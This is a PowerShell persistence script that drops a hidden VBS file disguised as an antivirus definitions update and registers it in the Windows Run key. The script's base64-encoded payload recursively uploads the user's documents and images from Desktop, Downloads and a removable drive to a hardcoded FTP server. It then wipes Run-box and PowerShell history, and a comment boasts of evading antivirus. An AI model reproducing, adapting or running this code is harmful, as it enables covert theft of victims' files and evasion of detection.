function add-persistence(){	
	
	# Default saving the payload to the %TEMP% directory
	$tmpdir = $env:APPDATA
	
	# Change this if desired.
	$payloadvbsloaderpath = "$tmpdir\update-avdefs.vbs"

	# Create the VBS file and insert the powershell command from unicorn.
	$vbs = "Set oShell = CreateObject( ""WScript.Shell"" )`r`n"
	$vbs += "ps = ""powershell -EncodedCommand JABEAGkAcgAgAD0AIAAiAEMAOgBcAFUAcwBlAHIAcwBcACQAZQBuAHYAOgB1AHMAZQByAG4AYQBtAGUAXABkAGUAcwBrAHQAbwBwACIALAAiAEMAOgBcAFUAcwBlAHIAcwBcACQAZQBuAHYAOgB1AHMAZQByAG4AYQBtAGUAXABEAG8AdwBuAGwAbwBhAGQAcwAiACwAIgBGADoAXAAiAA0ACgAkAEYAVABQACAAPQAgACIAZgB0AHAAOgAvAC8AdABlAHMAdABhAGQAbQBpAG4AOgB0AGUAcwB0AHAAYQBzAHMAdwBvAHIAZABAADEAOQAyAC4AMQAxADkALgA3ADEALgA4ADkALwBmAGkAbABlAHMALwAiAA0ACgAkAHcAZQBiAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAANAAoADQAKAGYAbwByAGUAYQBjAGgAKAAkAGkAdABlAG0AIABpAG4AIAAoAEcAZQB0AC0AQwBoAGkAbABkAEkAdABlAG0AIAAkAEQAaQByACAALQBJAG4AYwBsAHUAZABlACAAKgAuAHQAeAB0ACwAKgAuAHgAbABzAHgALAAqAC4AcABkAGYALAAqAC4AcABwAHQALAAqAC4AZABvAGMAeAAsACoALgBqAHAAZQBnACwAKgAuAGoAcABnACwAKgAuAHAAbgBnACAALQBSAGUAYwB1AHIAcwBlACkAKQB7AA0ACgAgACAAIAAgACQAVQBSAEkAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AVQByAGkAKAAkAEYAVABQACsAJABpAHQAZQBtAC4ATgBhAG0AZQApAA0ACgAgACAAIAAgACQAdwBlAGIALgBVAHAAbABvAGEAZABGAGkAbABlACgAJABVAFIASQAsACAAJABpAHQAZQBtAC4ARgB1AGwAbABOAGEAbQBlACkADQAKAH0ADQAKAGYAdQBuAGMAdABpAG8AbgAgAEMAbABlAGEAbgAtAEUAeABmAGkAbAB7AA0ACgANAAoACQAjAGQAZQBsAGUAdABlACAAcgB1AG4AIABiAG8AeAAgAGgAaQBzAHQAbwByAHkADQAKAAkAcgBlAGcAIABkAGUAbABlAHQAZQAgAEgASwBDAFUAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABFAHgAcABsAG8AcgBlAHIAXABSAHUAbgBNAFIAVQAgAC8AdgBhACAALwBmAA0ACgAJAA0ACgAJACMAZABlAGwAZQB0AGUAIABwAG8AdwBlAHIAcwBoAGUAbABsACAAaABpAHMAdABvAHIAeQANAAoACQBSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAoAEcAZQB0AC0AUABTAHIAZQBhAGQAbABpAG4AZQBPAHAAdABpAG8AbgApAC4ASABpAHMAdABvAHIAeQBTAGEAdgBlAFAAYQB0AGgADQAKAH0ADQAKAEMAbABlAGEAbgAtAEUAeABmAGkAbAA=""`r`n"
	$vbs += "oShell.run(ps),0,true"
	$vbs | Out-File $payloadvbsloaderpath -Force
	
	# Mark the file as hidden.
	$fileObj = get-item $payloadvbsloaderpath -Force
	$fileObj.Attributes="Hidden"

	# Set the LOAD key. Haven't been caught by AV yet. ;-)
	Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name UPDATE -Value $payloadvbsloaderpath

	
}
add-persistence
